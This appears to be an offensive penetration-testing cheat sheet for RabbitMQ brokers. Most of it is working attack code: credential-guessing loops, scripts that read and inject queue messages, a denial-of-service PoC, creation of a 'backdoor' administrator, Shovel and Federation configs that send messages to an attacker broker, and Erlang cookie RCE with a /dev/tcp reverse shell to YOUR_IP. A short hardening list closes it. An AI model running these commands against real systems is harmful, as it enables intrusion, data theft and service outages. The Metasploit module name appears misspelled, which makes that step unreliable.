---
title: "RabbitMQ Management"
date: 2026-02-24
draft: false
---

## Overview

RabbitMQ is a widely deployed open-source message broker implementing AMQP, MQTT, and STOMP protocols. Its management plugin exposes an HTTP API and web UI on port 15672. The notorious default credentials (`guest`/`guest`) and comprehensive management REST API make exposed RabbitMQ instances a frequent finding in internal penetration tests. Access to the management interface allows full enumeration of virtual hosts, queues, exchanges, bindings, and message interception/injection.

**Default Ports:**
| Port | Service |
|------|---------|
| 5672 | AMQP (unencrypted) |
| 5671 | AMQP over TLS |
| 15672 | Management HTTP API / Web UI |
| 15671 | Management HTTPS |
| 25672 | Erlang distribution (inter-node) |
| 4369 | EPMD (Erlang Port Mapper Daemon) |
| 1883 | MQTT plugin |
| 61613 | STOMP plugin |
| 15674 | STOMP over WebSocket |
| 15692 | Prometheus metrics (no auth by default) |

---

## Recon and Fingerprinting

### Step 0 — Prometheus Metrics Endpoint (Pre-Authentication Intel)

Before attempting any credentials, check the Prometheus metrics endpoint. It is enabled by the `rabbitmq_prometheus` plugin and by default requires **no authentication**:

```bash
# Default port 15692 — no authentication required by default
curl -s http://TARGET_IP:15692/metrics

# Key intelligence exposed without login:
# - Queue names and vhost names
# - Message rates and queue depths (reveals traffic patterns)
# - Node hostnames (reveals internal naming)
# - Connection counts and consumer counts
# - Memory and file descriptor usage

# Filter for queue names
curl -s http://TARGET_IP:15692/metrics | grep "rabbitmq_queue"

# Filter for connection info
curl -s http://TARGET_IP:15692/metrics | grep "rabbitmq_connections"

# Check if metrics endpoint is active
curl -s -o /dev/null -w "%{http_code}" http://TARGET_IP:15692/metrics
```

This should always be the **first reconnaissance step** — it provides full infrastructure intel without triggering any authentication event on port 15672.

### Nmap

```bash
nmap -sV -p 5672,15672,5671,15671,4369,25672,15692 TARGET_IP
nmap -p 15672 --script http-title,http-auth-finder TARGET_IP
```

### Management API Discovery

```bash
# Check management interface
curl -sv http://TARGET_IP:15672/ 2>&1 | grep -iE "rabbitmq|management|login"

# Check API endpoint
curl -sv http://TARGET_IP:15672/api/overview 2>&1

# Identify version
curl -s http://TARGET_IP:15672/api/overview | python3 -m json.tool | grep -i version
```

---

## Default Credentials — guest/guest

The `guest` account in RabbitMQ is restricted to `localhost` by default since RabbitMQ 3.3.0. However:
- Older versions allow `guest` from any IP
- Administrators sometimes explicitly re-enable remote `guest` access via `loopback_users = none` in `rabbitmq.conf`
- Custom builds and Docker images frequently re-enable it

> **Docker container nuance:** The `loopback_users` restriction is interface-based, not just IP-based. In Docker containers, the host machine connecting to the container's published port is considered "remote" by RabbitMQ — even if the container IP is 172.x.x.x. Guest access will be blocked unless `loopback_users = none` is explicitly set. Always check the config at `/etc/rabbitmq/rabbitmq.conf` if you have filesystem access.

```bash
# Test guest/guest
curl -s -u guest:guest http://TARGET_IP:15672/api/overview

# Test other common credentials
for cred in "guest:guest" "admin:admin" "admin:password" "rabbitmq:rabbitmq" "admin:guest" "rabbit:rabbit"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" http://TARGET_IP:15672/api/overview)
  echo "$cred -> $CODE"
done
```

---

## Management API Abuse

Once authenticated, the management REST API provides full control:

### Overview and Version

```bash
# Get broker overview (version, node info, stats)
curl -s -u admin:admin http://TARGET_IP:15672/api/overview | python3 -m json.tool

# Get cluster name
curl -s -u admin:admin http://TARGET_IP:15672/api/cluster-name | python3 -m json.tool
```

### Virtual Host Enumeration

```bash
# List all virtual hosts
curl -s -u admin:admin http://TARGET_IP:15672/api/vhosts | python3 -m json.tool

# Virtual host details
curl -s -u admin:admin "http://TARGET_IP:15672/api/vhosts/%2F" | python3 -m json.tool
```

### Queue Enumeration

```bash
# List all queues across all vhosts
curl -s -u admin:admin "http://TARGET_IP:15672/api/queues" | python3 -m json.tool

# List queues for specific vhost (/ = %2F)
curl -s -u admin:admin "http://TARGET_IP:15672/api/queues/%2F" | python3 -m json.tool

# Get queue details (message count, consumer count, etc.)
curl -s -u admin:admin "http://TARGET_IP:15672/api/queues/%2F/QUEUE_NAME" | python3 -m json.tool

# Filter for high-priority queues (many messages = sensitive data flow)
curl -s -u admin:admin "http://TARGET_IP:15672/api/queues" | \
  python3 -c "import sys,json; q=json.load(sys.stdin); [print(f'{x[\"messages\"]:6d} msgs  {x[\"vhost\"]}/{x[\"name\"]}') for x in sorted(q, key=lambda x: x.get('messages',0), reverse=True)]"
```

### Message Snooping — Get Messages from Queue

```bash
# Get up to 10 messages from a queue (non-destructive by default)
curl -s -u admin:admin \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"count":10,"ackmode":"ack_requeue_true","encoding":"auto"}' \
  "http://TARGET_IP:15672/api/queues/%2F/QUEUE_NAME/get" | python3 -m json.tool

# Destructive read (messages are removed from queue)
curl -s -u admin:admin \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"count":10,"ackmode":"ack_requeue_false","encoding":"auto"}' \
  "http://TARGET_IP:15672/api/queues/%2F/QUEUE_NAME/get"
```

### Publish Messages to Exchange

```bash
# Publish a message directly to an exchange
curl -s -u admin:admin \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"properties":{},"routing_key":"ROUTING_KEY","payload":"INJECTED_PAYLOAD","payload_encoding":"string"}' \
  "http://TARGET_IP:15672/api/exchanges/%2F/amq.direct/publish"

# Publish JSON payload
curl -s -u admin:admin \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "properties": {"content_type": "application/json"},
    "routing_key": "order.process",
    "payload": "{\"orderId\":\"EVIL_123\",\"amount\":0.01,\"status\":\"approved\"}",
    "payload_encoding": "string"
  }' \
  "http://TARGET_IP:15672/api/exchanges/%2F/amq.topic/publish"
```

---

## CVE-2023-46118 — DoS via Large HTTP Body

**CVSS:** 5.5 Medium
**Affected:** RabbitMQ < 3.11.18, < 3.12.7
**Type:** Denial of Service via oversized HTTP request body in management API
**CWE:** CWE-400

### Vulnerability Details

The RabbitMQ HTTP API did not enforce a maximum size on request bodies for certain endpoints. An authenticated attacker (or unauthenticated if no auth is configured) could send an arbitrarily large request body to management API endpoints, causing excessive memory consumption and potential service crash or OOM condition.

### PoC — DoS

```bash
# Generate large payload and send to a management endpoint
# WARNING: May crash the RabbitMQ management plugin

python3 -c "
import requests

TARGET = 'http://TARGET_IP:15672'
AUTH = ('admin', 'admin')

# Generate 100MB of data
large_payload = {
    'name': 'A' * (100 * 1024 * 1024),  # 100MB name field
}

try:
    r = requests.put(
        f'{TARGET}/api/vhosts/test_large',
        json=large_payload,
        auth=AUTH,
        timeout=30
    )
    print(f'Response: {r.status_code}')
except Exception as e:
    print(f'[+] Possible DoS: {e}')
"
```

---

## User Enumeration and Privilege Assessment

```bash
# List all users
curl -s -u admin:admin http://TARGET_IP:15672/api/users | python3 -m json.tool

# Get specific user details
curl -s -u admin:admin "http://TARGET_IP:15672/api/users/USERNAME" | python3 -m json.tool

# List permissions (who can access which vhost)
curl -s -u admin:admin http://TARGET_IP:15672/api/permissions | python3 -m json.tool

# Who has admin tags
curl -s -u admin:admin http://TARGET_IP:15672/api/users | \
  python3 -c "import sys,json; u=json.load(sys.stdin); [print(f'{x[\"name\"]} | tags: {x[\"tags\"]}') for x in u]"
```

### Create Admin User via API

```bash
# Add a backdoor admin user
curl -s -u admin:admin \
  -X PUT \
  -H "Content-Type: application/json" \
  -d '{"password":"hacked_pass","tags":"administrator"}' \
  "http://TARGET_IP:15672/api/users/backdoor"

# Grant full access to all vhosts
curl -s -u admin:admin \
  -X PUT \
  -H "Content-Type: application/json" \
  -d '{"configure":".*","write":".*","read":".*"}' \
  "http://TARGET_IP:15672/api/permissions/%2F/backdoor"
```

---

## AMQP Protocol — Direct Connection with pika

```python
#!/usr/bin/env python3
"""
RabbitMQ assessment via AMQP using pika
"""
import pika
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
PORT = 5672
CREDS = [
    ("guest", "guest"),
    ("admin", "admin"),
    ("admin", "password"),
    ("rabbitmq", "rabbitmq"),
]

def test_amqp(host, port, user, pwd, vhost="/"):
    try:
        creds = pika.PlainCredentials(user, pwd)
        params = pika.ConnectionParameters(
            host=host, port=port,
            virtual_host=vhost,
            credentials=creds,
            socket_timeout=5
        )
        conn = pika.BlockingConnection(params)
        channel = conn.channel()
        print(f"[+] AMQP connected: {user}:{pwd}@{host}:{port}/{vhost}")

        # List queues via passive declare
        # Enumerate common queue names
        queue_names = ["default", "tasks", "jobs", "emails", "notifications",
                       "orders", "payments", "logs", "events", "alerts"]
        for qname in queue_names:
            try:
                q = channel.queue_declare(queue=qname, passive=True)
                print(f"  Queue: {qname} ({q.method.message_count} messages, {q.method.consumer_count} consumers)")
            except Exception:
                pass

        conn.close()
        return True
    except pika.exceptions.AMQPConnectionError as e:
        print(f"[-] {user}:{pwd} -> {e}")
        return False

for user, pwd in CREDS:
    if test_amqp(TARGET, PORT, user, pwd):
        break
```

### Consume Messages via pika

```python
#!/usr/bin/env python3
"""Read messages from RabbitMQ queue."""
import pika
import json
import sys

TARGET = "TARGET_IP"
USER = "admin"
PASS = "admin"
QUEUE = "target_queue"  # Replace with discovered queue

credentials = pika.PlainCredentials(USER, PASS)
params = pika.ConnectionParameters(host=TARGET, credentials=credentials)
connection = pika.BlockingConnection(params)
channel = connection.channel()

msg_count = [0]

def callback(ch, method, properties, body):
    msg_count[0] += 1
    print(f"\n[+] Message {msg_count[0]}:")
    print(f"  Exchange: {method.exchange}")
    print(f"  Routing key: {method.routing_key}")
    print(f"  Content type: {properties.content_type}")
    try:
        body_str = body.decode('utf-8')
        # Try JSON parse
        try:
            parsed = json.loads(body_str)
            print(f"  Body (JSON): {json.dumps(parsed, indent=2)[:500]}")
        except Exception:
            print(f"  Body: {body_str[:500]}")
    except Exception:
        print(f"  Body (hex): {body.hex()[:200]}")

    # Acknowledge (removes from queue) or nack (returns to queue)
    ch.basic_nack(delivery_tag=method.delivery_tag, requeue=True)  # non-destructive

channel.basic_consume(queue=QUEUE, on_message_callback=callback, auto_ack=False)

try:
    print(f"[*] Consuming from {QUEUE}...")
    channel.start_consuming()
except KeyboardInterrupt:
    print(f"\n[*] Consumed {msg_count[0]} messages")
    channel.stop_consuming()

connection.close()
```

---

## Exchange Enumeration

```bash
# List all exchanges
curl -s -u admin:admin "http://TARGET_IP:15672/api/exchanges" | \
  python3 -c "import sys,json; [print(f'{x[\"vhost\"]}/{x[\"name\"]} [{x[\"type\"]}]') for x in json.load(sys.stdin)]"

# List bindings (queue-exchange relationships)
curl -s -u admin:admin "http://TARGET_IP:15672/api/bindings" | python3 -m json.tool

# Get exchange details
curl -s -u admin:admin "http://TARGET_IP:15672/api/exchanges/%2F/amq.topic" | python3 -m json.tool
```

---

## Full Assessment Script

```python
#!/usr/bin/env python3
"""Complete RabbitMQ management API assessment."""
import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
PORT = sys.argv[2] if len(sys.argv) > 2 else "15672"
BASE = f"http://{TARGET}:{PORT}/api"

CREDS_TO_TRY = [("guest","guest"),("admin","admin"),("admin","password"),("rabbitmq","rabbitmq")]
AUTH = None

for user, pwd in CREDS_TO_TRY:
    r = requests.get(f"{BASE}/overview", auth=(user, pwd), timeout=5)
    if r.status_code == 200:
        print(f"[+] Auth success: {user}:{pwd}")
        AUTH = (user, pwd)
        break

if not AUTH:
    print("[-] No valid credentials found")
    sys.exit(1)

def api_get(path):
    return requests.get(f"{BASE}{path}", auth=AUTH).json()

# Overview
overview = api_get("/overview")
print(f"\n[+] RabbitMQ {overview.get('rabbitmq_version','?')} on {overview.get('erlang_version','?')}")
print(f"    Node: {overview.get('node')}")
print(f"    Cluster: {overview.get('cluster_name')}")

# Vhosts
vhosts = api_get("/vhosts")
print(f"\n[+] Virtual Hosts ({len(vhosts)}):")
for v in vhosts:
    print(f"  {v['name']}")

# Queues
queues = api_get("/queues")
print(f"\n[+] Queues ({len(queues)}):")
for q in sorted(queues, key=lambda x: x.get('messages',0), reverse=True)[:20]:
    print(f"  {q['vhost']}/{q['name']}: {q.get('messages',0)} msgs, {q.get('consumers',0)} consumers")

# Users
users = api_get("/users")
print(f"\n[+] Users ({len(users)}):")
for u in users:
    print(f"  {u['name']} [tags: {u.get('tags','')}]")

# Sample messages from top queues
print("\n[+] Sampling messages from queues with messages:")
for q in queues:
    if q.get('messages', 0) > 0:
        vhost = requests.utils.quote(q['vhost'], safe='')
        resp = requests.post(
            f"{BASE}/queues/{vhost}/{q['name']}/get",
            auth=AUTH,
            json={"count":3,"ackmode":"ack_requeue_true","encoding":"auto"}
        )
        if resp.status_code == 200:
            msgs = resp.json()
            for msg in msgs:
                payload = msg.get('payload','')
                print(f"  [{q['name']}] {payload[:200]}")
```

---

## Queue Proliferation — DoS via Resource Exhaustion

A user with `configure` permission on a vhost can create an unlimited number of queues. Each queue allocates memory and file descriptors in the Erlang VM:

- Create thousands of queues with random names to exhaust memory or hit the Erlang process/PID limit
- This crashes the Erlang node and brings down the entire RabbitMQ broker
- No CVE is required — this is a logic/permission issue in the default authorization model
- Even a low-privilege application user with `configure: .*` permission is sufficient

**Risk assessment:** Any user account with configure permissions on a vhost should be considered a DoS risk against the broker.

---

## Shovel and Federation Plugin Abuse

If the Shovel or Federation plugins are active, an admin-level user can configure persistent message exfiltration to an attacker-controlled broker:

```bash
# Check which plugins are currently active
curl -s -u guest:guest http://TARGET_IP:15672/api/plugins

# Configure Shovel to forward messages from a target queue to attacker-controlled broker
curl -s -u admin:admin -X PUT http://TARGET_IP:15672/api/parameters/shovel/%2F/exfil \
  -H "Content-Type: application/json" \
  -d '{"value":{"src-uri":"amqp://","src-queue":"target-queue","dest-uri":"amqp://YOUR_IP","dest-queue":"stolen"}}'

# Configure Federation upstream for persistent cross-broker exfiltration
curl -s -u admin:admin -X PUT http://TARGET_IP:15672/api/parameters/federation-upstream/%2F/evil \
  -H "Content-Type: application/json" \
  -d '{"value":{"uri":"amqp://YOUR_IP"}}'

# Verify the shovel was created
curl -s -u admin:admin http://TARGET_IP:15672/api/parameters/shovel | python3 -m json.tool
```

This provides persistent message interception that survives broker restarts if the configuration is persisted to Mnesia (the default).

---

## Erlang Cookie — Port 25672 RCE

Port 25672 is the Erlang distribution port used for inter-node cluster communication. If the Erlang cookie (shared secret) can be obtained, it provides full unauthenticated RCE on the host — completely bypassing all RabbitMQ Management Plugin restrictions.

**Cookie locations:**
```bash
# Standard locations
cat /var/lib/rabbitmq/.erlang.cookie
cat $HOME/.erlang.cookie

# May also be obtainable via LFI vulnerabilities or misconfigured file permissions
# The file is typically owned by rabbitmq:rabbitmq with mode 0400
```

**RCE using the Erlang distribution protocol:**
```bash
# Metasploit module (most reliable)
use exploit/multi/misc/erlang_cookie_rcp
set RHOSTS TARGET_IP
set RPORT 25672
set COOKIE STOLEN_COOKIE_VALUE
set LHOST YOUR_IP
run

# Manual via Erlang shell (if erl is available locally)
# Start a local Erlang node with the stolen cookie
erl -sname attacker -setcookie STOLEN_COOKIE_VALUE

# From the Erlang shell, execute OS commands on the target node:
# (replace 'rabbit@TARGET_HOSTNAME' with the actual node name from nmap/banner)
# rpc:call('rabbit@TARGET_HOSTNAME', os, cmd, ["id"]).
# rpc:call('rabbit@TARGET_HOSTNAME', os, cmd, ["bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"]).
```

The node name can be retrieved from the Prometheus metrics endpoint (`rabbitmq_identity_info` label) or from the management API overview (`node` field).

---

## Hardening Recommendations

- Change `guest` password immediately or remove the account
- Set `loopback_users = []` in `rabbitmq.conf` only if needed (careful — allows remote guest)
- Enable TLS for AMQP (port 5671) and management (port 15671)
- Restrict management API access to trusted IP ranges via reverse proxy or firewall
- Apply the principle of least privilege for vhost and queue permissions
- Disable management plugin on production brokers where not needed
- Monitor for message consumption anomalies (unexpected consumer appearances)
- Apply rate limiting to the management API
- Upgrade to RabbitMQ 3.12.7+ or 3.11.18+ to patch CVE-2023-46118
- Use dedicated service accounts per application — not shared broker credentials
- Enable TLS mutual authentication for AMQP connections


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.